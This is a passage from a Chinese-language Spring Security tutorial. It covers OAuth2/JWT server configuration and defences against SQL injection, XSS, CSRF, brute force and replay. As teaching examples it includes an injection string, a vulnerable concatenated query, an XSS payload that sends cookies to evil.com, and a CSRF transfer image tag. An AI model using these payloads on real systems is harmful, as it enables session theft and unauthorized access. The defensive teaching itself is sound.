            .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)
            .authorizationGrantType(AuthorizationGrantType.REFRESH_TOKEN)
            .authorizationGrantType(AuthorizationGrantType.CLIENT_CREDENTIALS)
            .redirectUri("http://order-service/login/oauth2/code/sso")
            .scope(OidcScopes.OPENID)
            .scope(OidcScopes.PROFILE)
            .scope("order:read")
            .scope("order:write")
            .tokenSettings(TokenSettings.builder()
                .accessTokenTimeToLive(Duration.ofMinutes(15))
                .refreshTokenTimeToLive(Duration.ofDays(7))
                .build())
            .build();

        return new InMemoryRegisteredClientRepository(orderClient);
    }

    // JWT 簽名密鑰（RS256 非對稱加密）
    @Bean
    public JWKSource<SecurityContext> jwkSource() {
        KeyPair       keyPair    = generateRsaKey();
        RSAPublicKey  publicKey  = (RSAPublicKey)  keyPair.getPublic();
        RSAPrivateKey privateKey = (RSAPrivateKey) keyPair.getPrivate();

        RSAKey rsaKey = new RSAKey.Builder(publicKey)
            .privateKey(privateKey)
            .keyID(UUID.randomUUID().toString())
            .build();

        return new ImmutableJWKSet<>(new JWKSet(rsaKey));
    }

    private static KeyPair generateRsaKey() {
        try {
            KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
            generator.initialize(2048);
            return generator.generateKeyPair();
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
    }

    // 自定義 Token（在 JWT 中加入額外信息）
    @Bean
    public OAuth2TokenCustomizer<JwtEncodingContext> tokenCustomizer() {
        return context -> {
            if (context.getTokenType() == OAuth2TokenType.ACCESS_TOKEN) {
                Authentication principal = context.getPrincipal();
                UserPrincipal  user      = (UserPrincipal) principal.getPrincipal();

                context.getClaims()
                    .claim("userId", user.getId())
                    .claim("roles", user.getAuthorities().stream()
                        .map(GrantedAuthority::getAuthority)
                        .collect(Collectors.toSet()));
            }
        };
    }
}
```

```java
// Resource Server 配置（訂單系統、用戶系統等）
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class ResourceServerConfig {

    @Bean
    public SecurityFilterChain resourceServerFilterChain(
            HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/actuator/health").permitAll()
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt
                    // 從 Auth Server 的 JWK URI 取得公鑰（自動驗證）
                    .jwkSetUri("http://auth-server/.well-known/jwks.json")
                    .jwtAuthenticationConverter(jwtAuthenticationConverter())
                )
            );
        return http.build();
    }

    @Bean
    public JwtAuthenticationConverter jwtAuthenticationConverter() {
        JwtGrantedAuthoritiesConverter authoritiesConverter =
            new JwtGrantedAuthoritiesConverter();
        authoritiesConverter.setAuthoritiesClaimName("roles");
        authoritiesConverter.setAuthorityPrefix("");

        JwtAuthenticationConverter converter = new JwtAuthenticationConverter();
        converter.setJwtGrantedAuthoritiesConverter(authoritiesConverter);
        return converter;
    }
}
```

---

## 6️⃣ 常見攻擊防禦

---

### 🔴 SQL 注入（SQL Injection）

```java
// 攻擊原理：
// 用戶輸入：' OR '1'='1
// 惡意 SQL：SELECT * FROM users
//           WHERE username = '' OR '1'='1' AND password = ''
// 結果：繞過密碼驗證！

// ❌ 字串拼接（危險！）
String sql = "SELECT * FROM users WHERE username = '"
    + username + "' AND password = '" + password + "'";

// ✅ 預處理語句（Prepared Statement）
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, username);
ps.setString(2, password);

// ✅ MyBatis 使用 #{}（預處理）而不是 ${}（拼接）
// Mapper.xml：
// SELECT * FROM users WHERE username = #{username}   ✅
// SELECT * FROM users WHERE username = '${username}' ❌

// ✅ JPA（自動預處理）
userRepository.findByUsernameAndPassword(username, hashedPassword);

// ✅ 動態列名使用白名單
public List<User> getUsers(String orderBy) {
    Set<String> allowedColumns = Set.of("id", "username", "created_at");
    if (!allowedColumns.contains(orderBy)) {
        throw new IllegalArgumentException("不允許的排序字段: " + orderBy);
    }
    return userRepository.findAllOrderBy(orderBy);
}
```

---

### 🟡 XSS（跨站腳本攻擊）

```java
// 攻擊原理：
// 攻擊者在評論中輸入：
// <script>document.location='http://evil.com?c='+document.cookie</script>
// 其他用戶訪問頁面時，腳本執行，Cookie 被竊取！

// 防禦 1：Content Security Policy（CSP）
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp
            .policyDirectives(
                "default-src 'self'; " +
                "script-src 'self'; " +
                "style-src 'self' 'unsafe-inline'; " +
                "img-src 'self' data: https:; " +
                "frame-ancestors 'none'"
            )
        )
        .frameOptions(frame -> frame.deny())
        .xssProtection(xss -> xss.enable())
        .contentTypeOptions(Customizer.withDefaults())
    );
    return http.build();
}

// 防禦 2：輸入驗證與清理（OWASP Java HTML Sanitizer）
@Component
public class InputSanitizer {

    private final PolicyFactory policy = Sanitizers.FORMATTING
        .and(Sanitizers.LINKS);

    public String sanitize(String input) {
        return policy.sanitize(input);
        // <script>alert('xss')</script> → 被移除
        // <b>粗體</b> → 保留
    }
}
```

---

### 🟠 CSRF（跨站請求偽造）

```
攻擊原理：
  用戶登入了銀行網站（有 Cookie Session）
  同時訪問了惡意網站，惡意網站有：
  <img src="http://bank.com/transfer?to=hacker&amount=10000">
  瀏覽器自動帶上銀行的 Cookie，請求成功！

防禦方式：

方式 1：CSRF Token（傳統表單）
  服務器生成隨機 Token，放入表單隱藏字段
  每次請求都驗證 Token，惡意網站無法知道這個 Token！

方式 2：SameSite Cookie（現代方案）
  Set-Cookie: session=xxx; SameSite=Strict
  Strict：Cookie 只在同源請求中發送（跨站完全不發）

方式 3：JWT + 無 Cookie（前後端分離）
  Token 放 Authorization Header，不用 Cookie
  惡意網站無法設定 Authorization Header！
  → 天然防 CSRF，可以關閉 CSRF 保護
```

```java
// 前後端分離 + JWT：直接關閉 CSRF
http.csrf(csrf -> csrf.disable());

// 傳統 MVC + Session：使用 CSRF Token
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    // JS 可以讀取 XSRF-TOKEN Cookie
    // 前端請求時在 Header 帶上：X-XSRF-TOKEN: 讀取到的值
);
```

---

### 🔵 其他重要攻擊防禦

```java
// 1. 暴力破解（Brute Force）防禦
@Service
@RequiredArgsConstructor
public class LoginAttemptService {

    private final StringRedisTemplate redisTemplate;
    private static final int  MAX_ATTEMPTS   = 5;
    private static final long LOCK_DURATION  = 30; // 分鐘

    public void loginFailed(String username, String ip) {
        String key      = "login_attempt:" + ip + ":" + username;
        Long   attempts = redisTemplate.opsForValue().increment(key);

        if (attempts == 1) {
            redisTemplate.expire(key, LOCK_DURATION, TimeUnit.MINUTES);
        }

        if (attempts >= MAX_ATTEMPTS) {
            log.warn("帳號 {} (IP: {}) 已達登入失敗上限，鎖定 {} 分鐘",
                username, ip, LOCK_DURATION);
        }
    }

    public boolean isBlocked(String username, String ip) {
        String key      = "login_attempt:" + ip + ":" + username;
        String attempts = redisTemplate.opsForValue().get(key);
        return attempts != null && Integer.parseInt(attempts) >= MAX_ATTEMPTS;
    }

    public void loginSucceeded(String username, String ip) {
        redisTemplate.delete("login_attempt:" + ip + ":" + username);
    }
}

// 2. 敏感數據加密（AES-256-GCM）
@Component
public class FieldEncryptor {

    @Value("${app.encrypt.key}")
    private String encryptKey;

    public String encrypt(String plainText) throws Exception {
        SecretKey key    = new SecretKeySpec(
            Base64.getDecoder().decode(encryptKey), "AES");
        Cipher    cipher = Cipher.getInstance("AES/GCM/NoPadding");

        byte[] iv = new byte[12];
        new SecureRandom().nextBytes(iv);
        cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));

        byte[] encrypted = cipher.doFinal(plainText.getBytes());
        byte[] result    = new byte[iv.length + encrypted.length];
        System.arraycopy(iv,        0, result, 0,          iv.length);
        System.arraycopy(encrypted, 0, result, iv.length,  encrypted.length);

        return Base64.getEncoder().encodeToString(result);
    }

    public String decrypt(String encryptedText) throws Exception {
        byte[] data      = Base64.getDecoder().decode(encryptedText);
        byte[] iv        = Arrays.copyOfRange(data, 0,  12);
        byte[] encrypted = Arrays.copyOfRange(data, 12, data.length);

        SecretKey key    = new SecretKeySpec(
            Base64.getDecoder().decode(encryptKey), "AES");
        Cipher    cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(128, iv));

        return new String(cipher.doFinal(encrypted));
    }
}

// 3. 接口冪等性防重放攻擊
@RestController
public class PaymentController {

    @PostMapping("/pay")
    public ResponseEntity<?> pay(
            @RequestHeader("Idempotency-Key") String idempotencyKey,
            @RequestBody PaymentRequest request) {

        String  redisKey = "idempotency:" + idempotencyKey;
        Boolean isNew    = redisTemplate.opsForValue()
            .setIfAbsent(redisKey, "processing", 24, TimeUnit.HOURS);

        if (!Boolean.TRUE.equals(isNew)) {
            String result = redisTemplate.opsForValue().get(redisKey);
            return ResponseEntity.ok(result);
        }

        PaymentResult result = paymentService.pay(request);
        redisTemplate.opsForValue().set(redisKey,
            JSON.toJSONString(result), 24, TimeUnit.HOURS);

        return ResponseEntity.ok(result);
    }
}
```

---

## 📝 資安 總結

| 主題 | 核心要點 |
|------|---------|
| **BCrypt** | 含 Salt 的單向 Hash，密碼儲存唯一選擇 |
| **Spring Security** | 過濾器鏈架構，DaoAuthenticationProvider 認證流程 |
| **JWT 結構** | Header.Payload.Signature，Payload 不加密只編碼 |
| **JWT 設計** | Access Token 短效存 Memory，Refresh Token 長效存 HttpOnly Cookie + Redis |
| **OAuth2** | 授權碼模式最安全，PKCE 適合純前端，客戶端憑證適合服務間 |
| **SSO** | Auth Server（簽發 JWT）+ Resource Server（驗證 JWT）|
| **SQL 注入** | 用預處理語句，MyBatis 用 #{} 不用 ${} |
| **XSS** | 輸出編碼 + CSP Header + HttpOnly Cookie |
| **CSRF** | JWT + Bearer Header 天然防 CSRF，Session 需要 CSRF Token |
| **暴力破解** | Redis 計數 + 鎖定策略 |
| **敏感數據** | AES-256-GCM 加密儲存 |
| **冪等性** | Idempotency-Key + Redis setIfAbsent 防重放 |
